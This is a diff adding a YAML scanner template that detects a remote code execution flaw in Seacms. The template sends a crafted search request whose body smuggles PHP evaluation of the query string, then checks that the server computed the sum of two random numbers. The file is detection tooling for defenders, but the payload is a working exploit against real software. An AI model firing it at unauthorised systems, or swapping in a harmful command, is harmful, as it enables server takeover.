@@ -1,0 +1,31 @@
+id: poc-yaml-seacms-rce
+info:
+  name: Seacms Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Detects a remote code execution vulnerability in Seacms by evaluating expressions in the response body.
+variables:
+  random1: "{{rand_int(10000000, 80000000)}}"
+  random2: "{{rand_int(50000, 61000)}}"
+  sum: "{{to_number(random1) + to_number(random2)}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/search.php?print={{random1}}%2b{{random2}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{sum}}"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<svg xmlns="
